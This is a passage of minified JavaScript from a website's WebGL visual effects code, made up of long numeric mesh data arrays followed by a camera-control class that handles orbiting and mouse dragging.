0.311,0.928,0.050,0.363,0.769],[-156,24.8,-265,0.311,0.928,0.050,0.300,0.262],[-173,40.1,-327,0.223,0.922,0.251,0.405,0.736],[-142,25.8,-301,0.223,0.922,0.251,0.285,0.191],[-117,43.6,-355,0.001,0.906,0.368,0.148,0.240],[-110,28.1,-316,0.001,0.906,0.368,0.139,0.051],[-65.6,46.8,-359,-0.044,0.903,0.369,0.287,0.028],[-63.4,31.1,-320,-0.044,0.903,0.369,0.153,0.032],[-15.3,50,-359,-0.054,0.902,0.370,0.550,0.025],[-14.0,34.2,-321,-0.054,0.902,0.370,0.432,0.073],[34.9,53.2,-359,-0.063,0.902,0.372,0.564,0.047],[35.4,37.3,-320,-0.063,0.902,0.372,0.451,0.158],[85.7,56.8,-357,-0.090,0.902,0.376,0.415,0.038],[84.3,40.5,-319,-0.090,0.902,0.376,0.270,0.071],[140,61.7,-348,-0.257,0.886,0.334,0.366,0.022],[127,44.3,-312,-0.257,0.886,0.334,0.232,0.032],[182,70.4,-305,-0.477,0.840,0.127,0.380,0.050],[152,50.2,-284,-0.477,0.840,0.127,0.332,0.075],[207,76.7,-273,-0.334,0.874,0.250,0.397,0.064],[188,60.1,-240,-0.334,0.874,0.250,0.410,0.094],[243,82.3,-266,-0.105,0.912,0.339,0.462,0.051],[247,68.1,-227,-0.105,0.912,0.339,0.527,0.066],[284,97.3,-271,-0.554,0.708,0.397,0.326,0.029],[298,86.2,-232,-0.554,0.708,0.397,0.498,0.029],[308,140,-270,-0.863,0.218,0.412,0.369,0.174],[323,128,-232,-0.863,0.218,0.412,0.572,0.203],[323,185,-220,-0.971,-0.121,0.017,0.483,0.483],[328,143,-220,-0.971,-0.121,0.017,0.524,0.339],[322,174,-165,-0.963,-0.117,-0.049,0.675,0.648],[327,135,-177,-0.963,-0.117,-0.049,0.628,0.494],[328,148,-112,-0.918,-0.259,0.176,0.473,0.621],[330,119,-142,-0.918,-0.259,0.176,0.516,0.512],[361,100,-94.4,-0.705,-0.573,0.334,0.346,0.403],[351,89.8,-133,-0.705,-0.573,0.334,0.329,0.345],[396,71.2,-93.7,-0.329,-0.832,0.350,0.156,0.369],[392,56.6,-132,-0.329,-0.832,0.350,0.285,0.298],[440,71.6,-90.5,0.221,-0.859,0.382,0.104,0.364],[447,56.6,-128,0.221,-0.859,0.382,0.216,0.349],[481,95.5,-89.6,0.627,-0.630,0.390,0.057,0.332],[491,82.3,-127,0.627,-0.630,0.390,0.099,0.318],[513,132,-91.6,0.631,-0.649,0.393,0.153,0.385],[525,119,-130,0.631,-0.649,0.393,0.143,0.339],[556,152,-84.7,0.047,-0.933,0.299,0.158,0.372],[569,141,-122,0.047,-0.933,0.299,0.207,0.416],[596,154,-66.5,-0.210,-0.942,0.189,0.263,0.255],[619,142,-99.7,-0.210,-0.942,0.189,0.303,0.292],[612,149,-38.5,-0.405,-0.875,-0.168,0.170,0.240],[650,132,-44.5,-0.405,-0.875,-0.168,0.131,0.357],[608,138,6.06,-0.394,-0.851,-0.260,0.051,0.263],[646,120,7.70,-0.394,-0.851,-0.260,0.021,0.106],[600,127,53.7,-0.388,-0.849,-0.262,0.026,0.356],[637,109,56.1,-0.388,-0.849,-0.262,0,0.166],[593,116,103,-0.389,-0.863,-0.193,0.076,0.422],[630,99.4,103,-0.389,-0.863,-0.193,0.074,0.325],[599,109,158,-0.368,-0.896,0.055,0.100,0.407],[635,93.6,146,-0.368,-0.896,0.055,0.157,0.408],[621,110,206,-0.233,-0.870,0.327,0.100,0.365],[654,94.9,188,-0.233,-0.870,0.327,0.047,0.382],[654,137,235,0.285,-0.474,0.796,0.063,0.334],[683,117,213,0.285,-0.474,0.796,0.088,0.431],[702,178,229,0.505,-0.279,0.784,0.004,0.238],[708,140,212,0.505,-0.279,0.784,0.048,0.454],[750,183,196,0.571,-0.253,0.748,0.077,0.617],[742,143,188,0.571,-0.253,0.748,0.108,0.466],[789,182,165,0.574,-0.249,0.746,0.275,0.452],[781,141,157,0.574,-0.249,0.746,0.182,0.284],[828,180,135,0.584,-0.247,0.739,0.334,0.222],[821,140,126,0.584,-0.247,0.739,0.218,0.163],[862,185,108,0.634,-0.232,0.700,0.175,0.129],[865,147,92.4,0.634,-0.232,0.700,0.146,0.084],[879,207,95.5,0.756,-0.088,0.606,0.063,0.114],[902,193,64.0,0.756,-0.088,0.606,0.043,0.196]]],[300,3300,50,25,[[-803,155,-281,-0.083,0.282,-0.943,0.670,0.563],[-800,195,-270,-0.083,0.282,-0.943,0.328,0.494],[-754,152,-285,-0.035,0.276,-0.945,0.627,0.587],[-750,192,-274,-0.035,0.276,-0.945,0.351,0.545],[-707,146,-286,0.096,0.258,-0.948,0.594,0.633],[-699,186,-275,0.096,0.258,-0.948,0.390,0.603],[-661,132,-281,0.234,0.224,-0.937,0.569,0.577],[-649,171,-269,0.234,0.224,-0.937,0.492,0.702],[-617,113,-273,0.275,0.210,-0.932,0.465,0.392],[-602,151,-260,0.275,0.210,-0.932,0.474,0.711],[-572,93.5,-265,0.274,0.211,-0.933,0.348,0.333],[-557,131,-252,0.274,0.211,-0.933,0.417,0.636],[-528,72.9,-257,0.222,0.236,-0.943,0.116,0.268],[-512,110,-244,0.222,0.236,-0.943,0.220,0.433],[-482,53.2,-256,0.039,0.314,-0.947,0.223,0.319],[-466,90.7,-243,0.039,0.314,-0.947,0.144,0.401],[-437,38.2,-269,-0.296,0.426,-0.850,0.291,0.231],[-420,75.4,-256,-0.296,0.426,-0.850,0.151,0.375],[-395,28.8,-294,-0.453,0.462,-0.753,0.048,0.174],[-379,65.9,-281,-0.453,0.462,-0.753,0.051,0.225],[-355,22.3,-325,-0.503,0.472,-0.714,0.006,0.077],[-340,59.5,-311,-0.503,0.472,-0.714,0.047,0.148],[-316,18.3,-357,-0.528,0.477,-0.693,0.002,0.061],[-302,55.6,-342,-0.528,0.477,-0.693,0.069,0.148],[-274,19.4,-389,-0.554,0.479,-0.671,0.002,0.188],[-265,56.4,-370,-0.554,0.479,-0.671,0.064,0.386],[-224,40.2,-418,-0.610,0.451,-0.640,0.001,0.347],[-235,68.6,-388,-0.610,0.451,-0.640,0.067,0.531],[-185,84.0,-426,-0.619,0.444,-0.631,0,0.451],[-208,98.7,-393,-0.619,0.444,-0.631,0.078,0.625],[-157,130,-417,-0.565,0.536,-0.603,0.012,0.495],[-185,135,-386,-0.565,0.536,-0.603,0.114,0.548],[-132,173,-388,-0.415,0.791,-0.419,0.046,0.274],[-167,167,-366,-0.415,0.791,-0.419,0.286,0.234],[-117,194,-338,-0.323,0.925,-0.143,0.124,0.170],[-157,182,-328,-0.323,0.925,-0.143,0.207,0.171],[-109,202,-288,-0.306,0.940,-0.065,0.237,0.208],[-148,190,-280,-0.306,0.940,-0.065,0.136,0.255],[-101,207,-239,-0.299,0.944,-0.030,0.063,0.216],[-141,195,-232,-0.299,0.944,-0.030,0.150,0.242],[-94.0,210,-189,-0.292,0.945,-0.003,0.285,0.149],[-133,198,-182,-0.292,0.945,-0.003,0.227,0.371],[-85.2,212,-141,-0.278,0.946,0.035,0.193,0.482],[-124,200,-132,-0.278,0.946,0.035,0.094,0.569],[-72.8,212,-96.0,-0.241,0.944,0.142,0.066,0.585],[-110,200,-81.9,-0.241,0.944,0.142,0.013,0.580],[-50.5,207,-64.4,-0.025,0.888,0.434,0.113,0.555],[-76.3,191,-34.6,-0.025,0.888,0.434,0.036,0.615],[-12.1,193,-49.8,0.186,0.815,0.529,0.192,0.352],[-26.6,174,-14.9,0.186,0.815,0.529,0.115,0.380],[31.7,176,-44.7,0.293,0.772,0.540,0.654,0.400],[22.1,155,-9.37,0.293,0.772,0.540,0.563,0.466],[72.9,158,-48.7,0.563,0.640,0.495,0.410,0.422],[71.0,133,-14.5,0.563,0.640,0.495,0.396,0.575],[91.5,136,-75.9,0.959,0.240,0.039,0.242,0.691],[99.2,101,-52.6,0.959,0.240,0.039,0.338,0.633],[95.2,110,-118,0.974,0.153,-0.083,0.185,0.373],[102,75.5,-94.9,0.974,0.153,-0.083,0.404,0.441],[93.1,68.2,-161,0.963,-0.012,-0.224,0.330,0.717],[101,50.3,-124,0.963,-0.012,-0.224,0.400,0.455],[82.3,4.01,-151,0.921,-0.291,-0.232,0.392,0.432],[96.9,21.5,-115,0.921,-0.291,-0.232,0.541,0.451],[76.6,-40,-123,0.932,-0.217,-0.284,0.485,0.206],[92.0,-18.2,-89.6,0.932,-0.217,-0.284,0.724,0.259],[92.7,-81.8,-99.8,0.530,0.522,-0.664,0.354,0.060],[105,-55.6,-68.6,0.530,0.522,-0.664,0.516,0.066],[142,-96.8,-103,-0.098,0.756,-0.643,0.399,0],[149,-68.9,-71.9,-0.098,0.756,-0.643,0.623,0.008],[194,-82.3,-117,-0.634,0.589,-0.493,0.435,0.000],[189,-59.0,-82.4,-0.634,0.589,-0.493,0.645,0.022],[226,-39.2,-130,-0.844,0.329,-0.405,0.339,0.147],[213,-23.7,-93.1,-0.844,0.329,-0.405,0.534,0.292],[246,6.55,-141,-0.864,0.287,-0.393,0.265,0.269],[233,19.6,-102,-0.864,0.287,-0.393,0.358,0.476],[266,54.6,-148,-0.844,0.332,-0.387,0.352,0.418],[251,63.0,-109,-0.844,0.332,-0.387,0.306,0.495],[292,107,-130,-0.665,0.685,-0.265,0.892,0.518],[266,93.8,-99.9,-0.665,0.685,-0.265,0.553,0.351],[314,138,-94.8,-0.631,0.734,-0.214,0.919,0.442],[286,122,-66.8,-0.631,0.734,-0.214,0.781,0.425],[335,165,-58.5,-0.612,0.753,-0.190,0.738,0.497],[307,149,-30.5,-0.612,0.753,-0.190,0.640,0.546],[357,189,-25.2,-0.543,0.814,-0.115,0.550,0.474],[332,177,6.64,-0.543,0.814,-0.115,0.375,0.390],[387,199,-15.9,-0.081,0.984,0.076,0.327,0.497],[389,196,26.4,-0.081,0.984,0.076,0.104,0.417],[436,201,-19.3,-0.015,0.989,0.080,0.169,0.227],[439,197,22.9,-0.015,0.989,0.080,0.055,0.177],[490,201,-18.9,-0.012,0.990,0.080,0.081,0.054],[485,198,23.1,-0.012,0.990,0.080,0.021,0.013],[548,201,11.9,-0.064,0.990,0.046,0.010,0.104],[514,198,36.8,-0.064,0.990,0.046,0.002,0.041],[569,201,66.0,-0.066,0.990,0.015,0,0.252],[527,198,75.7,-0.066,0.990,0.015,0.001,0.073],[581,201,110,-0.061,0.990,0.025,0,0.289],[542,198,127,-0.061,0.990,0.025,0,0.091],[604,201,132,-0.024,0.990,0.065,0,0.341],[589,198,172,-0.024,0.990,0.065,0,0.316],[647,201,141,-0.011,0.990,0.072,0,0.632],[643,198,183,-0.011,0.990,0.072,0,0.636],[696,201,145,-0.013,0.990,0.074,0,0.561],[694,198,187,-0.013,0.990,0.074,0,0.772],[746,202,148,-0.014,0.991,0.074,0.007,0.622],[744,199,190,-0.014,0.991,0.074,0,0.621],[796,202,150,-0.018,0.991,0.073,0.012,0.371],[794,199,193,-0.018,0.991,0.073,0,0.385],[846,204,153,-0.028,0.992,0.073,0.020,0.326],[844,200,195,-0.028,0.992,0.073,0,0.343],[895,205,155,-0.046,0.992,0.072,0.086,0.306],[894,202,198,-0.046,0.992,0.072,0.012,0.193],[945,208,157,-0.078,0.992,0.070,0.227,0.178],[943,205,200,-0.078,0.992,0.070,0.044,0.057],[995,213,160,-0.156,0.984,0.066,0.413,0.136],[993,210,203,-0.156,0.984,0.066,0.491,0.224],[1043,226,163,-0.422,0.903,0.048,0.419,0.083],[1041,223,206,-0.422,0.903,0.048,0.585,0.174],[1077,260,166,-0.905,0.417,0.003,0.421,0],[1076,258,209,-0.905,0.417,0.003,0.523,0],[1089,307,168,-0.985,0.131,-0.005,0.289,0],[1089,307,210,-0.985,0.131,-0.005,0.388,0]]],[300,3100,50,25,[[-805,78.9,-114,0.164,-0.557,0.785,0.049,0.052],[-809,44.6,-137,0.164,-0.557,0.785,0.089,0.064],[-756,79.9,-122,0.137,-0.559,0.786,0.152,0.079],[-759,45.7,-146,0.137,-0.559,0.786,0.221,0.092],[-709,82.2,-127,0.059,-0.563,0.795,0.179,0.074],[-707,48.2,-151,0.059,-0.563,0.795,0.313,0.100],[-663,87.4,-124,-0.041,-0.570,0.795,0.128,0.058],[-655,53.7,-147,-0.041,-0.570,0.795,0.045,0.060],[-616,94.8,-114,-0.092,-0.574,0.789,0.182,0.051],[-605,61.4,-137,-0.092,-0.574,0.789,0.164,0.164],[-568,102,-102,-0.106,-0.576,0.788,0.230,0.181],[-557,69.0,-125,-0.106,-0.576,0.788,0.310,0.275],[-518,108,-91.7,-0.097,-0.575,0.789,0.221,0.244],[-510,74.8,-115,-0.097,-0.575,0.789,0.219,0.249],[-466,111,-83.7,-0.077,-0.575,0.792,0.224,0.389],[-463,77.7,-108,-0.077,-0.575,0.792,0.394,0.420],[-415,112,-79.1,-0.062,-0.575,0.792,0.265,0.487],[-414,77.9,-103,-0.062,-0.575,0.792,0.401,0.571],[-365,110,-76.4,-0.054,-0.574,0.794,0.257,0.631],[-365,76.5,-101,-0.054,-0.574,0.794,0.379,0.640],[-313,107,-75.4,-0.043,-0.571,0.798,0.245,0.595],[-316,73.6,-100,-0.043,-0.571,0.798,0.451,0.597],[-256,97.4,-81.4,0.025,-0.587,0.788,0.436,0.604],[-276,67.3,-103,0.025,-0.587,0.788,0.483,0.554],[-220,58.4,-117,0.100,-0.667,0.714,0.448,0.387],[-260,46.4,-123,0.100,-0.667,0.714,0.445,0.357],[-208,24.0,-154,0.124,-0.740,0.644,0.201,0.464],[-249,14.5,-157,0.124,-0.740,0.644,0.262,0.334],[-201,0.540,-198,0.185,-0.942,0.227,0.127,0.784],[-242,-7.87,-199,0.185,-0.942,0.227,0.097,0.761],[-198,-4.02,-248,0.192,-0.963,0.026,0.031,0.885],[-240,-12.3,-249,0.192,-0.963,0.026,0.006,0.742],[-195,-3.21,-296,0.192,-0.965,-0.032,0.015,0.798],[-236,-11.2,-301,0.192,-0.965,-0.032,0,0.751],[-186,1.81,-340,0.208,-0.956,-0.117,0.004,0.748],[-225,-4.99,-354,0.208,-0.956,-0.117,0,0.629],[-166,13.8,-365,0.348,-0.872,-0.292,0.004,0.583],[-189,16.6,-401,0.348,-0.872,-0.292,0,0.528],[-131,34.5,-375,0.441,-0.814,-0.323,0.029,0.526],[-141,45.0,-414,0.441,-0.814,-0.323,0.009,0.338],[-90,57.4,-375,0.432,-0.815,-0.320,0.061,0.242],[-95.0,70.3,-415,0.432,-0.815,-0.320,0.010,0.199],[-45.4,77.7,-373,0.343,-0.853,-0.323,0.266,0.129],[-48.7,91.3,-412,0.343,-0.853,-0.323,0.060,0.097],[1.88,92.0,-371,0.206,-0.896,-0.328,0.294,0.254],[-0.510,105,-411,0.206,-0.896,-0.328,0.086,0.069],[50.7,99.6,-371,0.093,-0.918,-0.332,0.299,0.207],[49.3,113,-410,0.093,-0.918,-0.332,0.088,0.019],[99.2,103,-370,0.083,-0.924,-0.336,0.276,0.156],[100,117,-410,0.083,-0.924,-0.336,0.073,0.082],[141,107,-362,0.333,-0.891,-0.267,0.250,0.147],[155,124,-398,0.333,-0.891,-0.267,0.061,0.099],[155,119,-336,0.679,-0.669,0.247,0.268,0.204],[186,145,-348,0.679,-0.669,0.247,0.120,0.122],[151,136,-293,0.660,-0.618,0.371,0.326,0.056],[181,165,-299,0.660,-0.618,0.371,0.230,-0.087],[142,155,-247,0.651,-0.622,0.368,0.338,-0.049],[172,183,-254,0.651,-0.622,0.368,0.422,0.019],[142,179,-195,0.634,-0.721,0.154,0.709,-0.035],[172,200,-215,0.634,-0.721,0.154,0.574,-0.037],[188,202,-157,0.280,-0.918,-0.171,0.780,0.181],[196,212,-197,0.280,-0.918,-0.171,0.634,0.092],[240,211,-150,0.092,-0.948,-0.204,0.590,0.428],[241,220,-191,0.092,-0.948,-0.204,0.540,0.183],[290,211,-150,-0.097,-0.945,-0.208,0.279,0.693],[291,220,-190,-0.097,-0.945,-0.208,0.291,0.451],[339,201,-151,-0.281,-0.915,-0.203,0.430,0.774],[340,210,-192,-0.281,-0.915,-0.203,0.354,0.521],[386,185,-153,-0.342,-0.901,-0.200,0.448,0.698],[387,193,-194,-0.342,-0.901,-0.200,0.417,0.444],[433,167,-155,-0.346,-0.900,-0.199,0.436,0.537],[434,176,-196,-0.346,-0.900,-0.199,0.293,0.359],[480,150,-158,-0.344,-0.904,-0.199,0.240,0.475],[480,159,-199,-0.344,-0.904,-0.199,0.248,0.332],[528,133,-162,-0.294,-0.922,-0.204,0.256,0.319],[527,143,-203,-0.294,-0.922,-0.204,0.231,0.197],[578,122,-168,-0.132,-0.956,-0.226,0.138,0.138],[573,133,-208,-0.132,-0.956,-0.226,0.233,0.139],[631,126,-179,0.153,-0.930,-0.289,0.375,0.075],[617,136,-218,0.153,-0.930,-0.289,0.429,0.083],[677,144,-195,0.301,-0.870,-0.339,0.442,0.102],[660,153,-232,0.301,-0.870,-0.339,0.416,0.039],[720,166,-209,0.324,-0.853,-0.350,0.182,0.228],[703,175,-246,0.324,-0.853,-0.350,0.183,0.171],[761,183,-219,0.246,-0.884,-0.335,0.030,0.328],[751,196,-258,0.246,-0.884,-0.335,0.027,0.315],[805,193,-220,0.138,-0.913,-0.329,0.011,0.348],[805,208,-260,0.138,-0.913,-0.329,0.005,0.368],[849,196,-213,0.118,-0.918,-0.331,0.001,0.370],[859,212,-252,0.118,-0.918,-0.331,0.001,0.396],[886,197,-196,0.226,-0.919,-0.272,0,0.376],[911,212,-226,0.226,-0.919,-0.272,0,0.427],[909,197,-163,0.323,-0.919,-0.133,0,0.345],[945,212,-178,0.323,-0.919,-0.133,0,0.437],[922,197,-118,0.341,-0.919,-0.076,0,0.253],[961,212,-127,0.341,-0.919,-0.076,0,0.255],[931,197,-70.8,0.347,-0.920,-0.044,0,0.295],[970,212,-77.0,0.347,-0.920,-0.044,0,0.335],[937,198,-22.4,0.353,-0.922,-0.003,0,0.579],[977,213,-26.1,0.353,-0.922,-0.003,0,0.613],[939,201,25.7,0.354,-0.922,0.109,0.004,0.527],[978,216,25.2,0.354,-0.922,0.109,0,0.524],[932,228,69.0,0.196,-0.262,0.931,0.078,0.218],[973,234,61.9,0.196,-0.262,0.931,0.043,0.176],[930,280,75.4,0.186,-0.040,0.961,0.068,0.142],[972,281,67.5,0.186,-0.040,0.961,0.042,0.160],[930,330,77.0,0.185,-0.024,0.962,0,0.042],[971,331,69.1,0.185,-0.024,0.962,0,0.075],[929,380,78.2,0.185,-0.020,0.963,0,0.000],[971,381,70.3,0.185,-0.020,0.963,0,0.000],[929,430,79.3,0.185,-0.015,0.964,0,0.000],[970,431,71.4,0.185,-0.015,0.964,0,0.000]]],[200,3850,50,20,[[-715,399,-458,0.568,-0.006,-0.822,0,0],[-680,400,-434,0.568,-0.006,-0.822,0,0],[-715,349,-458,0.568,-0.007,-0.822,0,0],[-680,350,-434,0.568,-0.007,-0.822,0,0],[-715,299,-458,0.568,-0.007,-0.822,0,0.000],[-680,300,-433,0.568,-0.007,-0.822,0,0.000],[-715,249,-457,0.568,-0.008,-0.822,0,0.015],[-680,250,-433,0.568,-0.008,-0.822,0,0.031],[-715,199,-456,0.568,-0.016,-0.821,0,0.112],[-680,200,-432,0.568,-0.016,-0.821,0,0.162],[-715,149,-454,0.569,-0.047,-0.819,0,0.262],[-680,150,-430,0.569,-0.047,-0.819,0,0.388],[-715,98.1,-449,0.571,-0.153,-0.804,0,0.303],[-680,102,-424,0.571,-0.153,-0.804,0,0.432],[-715,48.8,-419,0.570,-0.663,-0.482,0,0.212],[-680,68.6,-404,0.570,-0.663,-0.482,0,0.305],[-715,29.5,-367,0.567,-0.811,-0.139,0,0.093],[-680,53.3,-363,0.567,-0.811,-0.139,0,0.157],[-717,23.2,-318,0.565,-0.822,-0.066,0,0.028],[-681,47.2,-313,0.565,-0.822,-0.066,0,0.100],[-720,17.1,-270,0.566,-0.820,-0.072,0,0.018],[-685,40.6,-262,0.566,-0.820,-0.072,0.006,0.088],[-727,7.57,-223,0.570,-0.814,-0.104,0,0.090],[-692,30.2,-212,0.570,-0.814,-0.104,0.005,0.182],[-736,-5.59,-177,0.574,-0.807,-0.130,0.001,0.042],[-701,16.5,-164,0.574,-0.807,-0.130,0.006,0.108],[-742,-19.8,-125,0.578,-0.798,-0.166,0.002,0.219],[-707,4.29,-120,0.578,-0.798,-0.166,0.014,0.349],[-718,-19.2,-62.3,0.540,-0.802,-0.253,0.002,0.130],[-700,3.15,-93.8,0.540,-0.802,-0.253,0.015,0.292],[-668,5.34,-40.8,0.490,-0.826,-0.277,0.011,0.115],[-667,19.5,-81.2,0.490,-0.826,-0.277,0.035,0.272],[-623,28.8,-34.0,0.451,-0.845,-0.284,0.099,0.098],[-624,41.6,-74.9,0.451,-0.845,-0.284,0.226,0.241],[-577,49.3,-29.6,0.377,-0.877,-0.292,0.199,0.100],[-579,62.3,-70.4,0.377,-0.877,-0.292,0.367,0.240],[-531,64.0,-25.2,0.245,-0.920,-0.304,0.294,0.110],[-530,77.6,-65.8,0.245,-0.920,-0.304,0.407,0.269],[-483,72.4,-20.5,0.165,-0.933,-0.313,0.367,0.151],[-481,86.3,-60.9,0.165,-0.933,-0.313,0.395,0.382],[-430,85.5,-17.3,0.440,-0.842,-0.305,0.466,0.133],[-437,96.8,-58.0,0.440,-0.842,-0.305,0.459,0.241],[-398,135,-27.0,0.877,-0.237,-0.415,0.354,0.106],[-418,126,-64.0,0.877,-0.237,-0.415,0.388,0.153],[-404,189,-52.9,0.873,-0.071,-0.482,0.161,0.051],[-421,161,-80.3,0.873,-0.071,-0.482,0.321,0.137],[-431,217,-103,0.863,-0.052,-0.501,0.164,0.035],[-436,175,-108,0.863,-0.052,-0.501,0.273,0.149],[-456,220,-150,0.909,-0.056,-0.407,0.122,0.035],[-458,178,-149,0.909,-0.056,-0.407,0.174,0.132],[-466,219,-198,0.987,-0.040,0.135,0.204,0.135],[-468,177,-196,0.987,-0.040,0.135,0.284,0.242],[-440,216,-240,0.650,0.010,0.758,0.293,0.396],[-442,173,-237,0.650,0.010,0.758,0.387,0.587],[-399,212,-269,0.540,0.020,0.840,0.233,0.563],[-401,169,-266,0.540,0.020,0.840,0.264,0.723],[-357,210,-293,0.444,0.021,0.894,0.193,0.720],[-357,167,-292,0.444,0.021,0.894,0.151,0.803],[-315,214,-306,0.096,-0.024,0.993,0.177,0.707],[-305,173,-308,0.096,-0.024,0.993,0.133,0.896],[-275,230,-301,-0.262,-0.163,0.950,0.193,0.454],[-254,193,-301,-0.262,-0.163,0.950,0.154,0.737],[-237,254,-281,-0.387,-0.237,0.890,0.078,0.243],[-215,218,-281,-0.387,-0.237,0.890,0.126,0.453],[-195,276,-257,-0.379,-0.236,0.894,0.057,0.113],[-178,237,-260,-0.379,-0.236,0.894,0.161,0.286],[-147,290,-234,-0.329,-0.224,0.917,0.109,0.056],[-138,248,-241,-0.329,-0.224,0.917,0.236,0.188],[-95.6,291,-217,-0.264,-0.221,0.938,0.142,0.118],[-96.1,250,-227,-0.264,-0.221,0.938,0.198,0.187],[-44.4,284,-206,-0.202,-0.229,0.951,0.085,0.178],[-50.6,243,-218,-0.202,-0.229,0.951,0.086,0.206],[5.33,273,-201,-0.101,-0.250,0.961,0.258,0.262],[-3.46,233,-212,-0.101,-0.250,0.961,0.167,0.295],[53.0,264,-206,0.276,-0.310,0.908,0.378,0.304],[46.0,224,-217,0.276,-0.310,0.908,0.433,0.351],[91.7,268,-231,0.732,-0.274,0.623,0.187,0.322],[88.9,228,-246,0.732,-0.274,0.623,0.332,0.309],[121,281,-269,0.812,-0.244,0.527,0.197,0.113],[119,241,-284,0.812,-0.244,0.527,0.349,0.090],[155,292,-305,0.556,-0.309,0.767,0.211,0.014],[151,251,-318,0.556,-0.309,0.767,0.336,0.006],[206,287,-320,-0.064,-0.254,0.962,0.214,0],[195,248,-331,-0.064,-0.254,0.962,0.303,0],[247,261,-298,-0.795,0.215,0.563,0.142,0.059],[226,228,-315,-0.795,0.215,0.563,0.202,0.054],[257,231,-258,-0.858,0.372,0.351,0.145,0.202],[235,200,-277,-0.858,0.372,0.351,0.228,0.205],[260,205,-216,-0.863,0.409,0.291,0.350,0.448],[238,172,-234,-0.863,0.409,0.291,0.419,0.494],[262,182,-174,-0.867,0.435,0.238,0.725,0.688],[241,148,-188,-0.867,0.435,0.238,0.680,0.742],[265,170,-132,-0.874,0.463,0.140,0.930,0.659],[244,133,-135,-0.874,0.463,0.140,0.735,0.783],[270,176,-93.2,-0.889,0.456,0.010,0.766,0.628],[252,141,-77.5,-0.889,0.456,0.010,0.532,0.591],[281,195,-55.5,-0.873,0.483,0.042,0.393,0.572],[266,165,-28.8,-0.873,0.483,0.042,0.232,0.498],[300,215,-35.8,-0.561,0.778,0.278,0.023,0.492],[302,203,4.93,-0.561,0.778,0.278,0.009,0.470],[334,232,-44.9,-0.248,0.941,0.228,0.006,0.465],[354,228,-7.39,-0.248,0.941,0.228,0,0.505],[369,244,-69.0,-0.157,0.973,0.168,0.006,0.539],[398,243,-37.5,-0.157,0.973,0.168,0,0.450],[398,253,-103,-0.115,0.985,0.122,0.011,0.716],[433,254,-78.0,-0.115,0.985,0.122,0.001,0.578],[425,260,-143,-0.102,0.989,0.103,0.014,0.623],[461,262,-120,-0.102,0.989,0.103,0,0.721],[451,267,-185,-0.100,0.989,0.100,0.009,0.393],[487,269,-162,-0.100,0.989,0.100,0,0.552],[477,274,-227,-0.096,0.990,0.094,0.004,0.152],[513,276,-204,-0.096,0.990,0.094,0,0.242],[505,281,-269,-0.089,0.992,0.084,0,0.027],[540,282,-244,-0.089,0.992,0.084,0,0.085],[540,287,-310,-0.065,0.996,0.058,0,0.006],[569,287,-279,-0.065,0.996,0.058,0,0.013],[591,290,-340,-0.002,0.999,0.023,0,0.002],[604,289,-299,-0.002,0.999,0.023,0,0.004],[651,288,-344,0.079,0.996,0.017,0,0.002],[642,288,-302,0.079,0.996,0.017,0,0.004],[702,282,-328,0.102,0.994,0.024,0,0.019],[686,283,-288,0.102,0.994,0.024,0,0.055],[748,277,-307,0.110,0.993,0.027,0,0.084],[730,278,-268,0.110,0.993,0.027,0,0.187],[793,271,-285,0.111,0.993,0.028,0,0.197],[774,272,-246,0.111,0.993,0.028,0,0.352],[838,266,-262,0.111,0.993,0.028,0,0.341],[819,267,-224,0.111,0.993,0.028,0.007,0.493],[882,260,-240,0.109,0.993,0.027,0,0.429],[863,261,-202,0.109,0.993,0.027,0.006,0.561],[926,255,-219,0.089,0.995,0.018,0,0.399],[909,256,-180,0.089,0.995,0.018,0.001,0.607],[970,252,-203,0.052,0.998,0.004,0.001,0.177],[958,252,-162,0.052,0.998,0.004,0.003,0.415],[1017,250,-192,0.012,0.999,-0.004,0.002,0.025],[1009,251,-150,0.012,0.999,-0.004,0.014,0.076],[1065,251,-185,-0.044,0.998,-0.013,0.025,0.002],[1060,251,-142,-0.044,0.998,-0.013,0.042,0.002],[1114,256,-178,-0.168,0.982,-0.028,0.085,0],[1109,256,-136,-0.168,0.982,-0.028,0.136,0],[1161,272,-173,-0.563,0.819,-0.075,0.105,0],[1156,273,-131,-0.563,0.819,-0.075,0.132,0],[1187,313,-170,-0.951,0.281,-0.121,0.099,0],[1182,313,-127,-0.951,0.281,-0.121,0.100,0],[1196,362,-169,-0.985,0.109,-0.125,0.039,0],[1191,362,-126,-0.985,0.109,-0.125,0.039,0]]],null,null,null,null,null,null]";Acko.Effect=function(){this.order=0;this.renderer="webgl"};Acko.Effect.prototype={build:function(a){},update:function(a){},tick:function(a){},resize:function(a){},};Acko.Effects=[];Acko.Effect.Camera=function(){Acko.Effect.call(this);this.order=-2;this.fov=30;this.renderer="webgl";this.phi=0;this.theta=0;this.perspective=0;this.lookAt=_v(0,0,0);this.center=_v(0,0,0);this.orbitScale=1;this.thetaI=this.thetaT=this.thetaA=this.thetaB=0.27;this.phiT=this.phiA=this.phiB=0;this.orbitT=this.orbitA=this.orbitB=1;this.phiDelta=this.thetaDelta=this.orbitFactor=0;this.heroScale=1;this.overlayScale=1;this.phiC=-0.64;this.orbitC=1200;this.scrollEaseRatio=0.1;this.scrollEaseRange=1.7;this.slowframes=0;this.forceLock=0;this.controls=hasAchievement("prllx");this.absolute=1;this.sacc=0;this.sdir=0;this.scnt=1;this.shdr=0;this.travel=0;this.last=[-1,-1];this.cuts=0;this.bounceLimit=8;this.ignoreClicks=0;this.growlCancel=[];this.lastAudio=0;this.cameraLock=true;this.rides=Acko.CameraRides;this.activeRide=-1;this.v1=_v();this.v2=_v();this.v3=_v();this.v4=_v();this.m1=new THREE.Matrix4();this.m2=new THREE.Matrix4();this.handlers={document:{},window:{},};this.container=null};Acko.Effect.Camera.prototype=_.extend(new Acko.Effect(),{build:function(a){a.cameraController=this;this.bind();this.container=document.querySelector("#native-frame");this.parent=a.parent},bind:function(){var e=false;var a=false;var f=[0,0,0,0];var b=null;var c=null;var g=function(l){l=l||{};var h=(l.clientY||f[3])+(this.last.y||0);if(l.clientY){f[3]=l.clientY}var j=(h<this.pageStart);var k=b&&b.classList.contains("draggable");this.cameraLock=!(k||e);a=(this.controls&&!this.ride&&j)||k;var m=a?"move":"default";if(m!=c){this.pointerPunch.style.cursor=m;c=m}}.bind(this);document.addEventListener("mousedown",this.handlers.document.mousedown=function(h){if(h.which!=1||(h.target.tagName=="SELECT")){return}e=a;f=[h.pageX,h.pageY,h.clientX,h.clientY];if(e){h.preventDefault()}}.bind(this));document.addEventListener("mouseup",this.handlers.document.mouseup=function(h){e=false;this.cameraLock=false}.bind(this));document.addEventListener("mousemove",this.handlers.document.mousemove=function(j){b=j.target;g(j);if(e){var 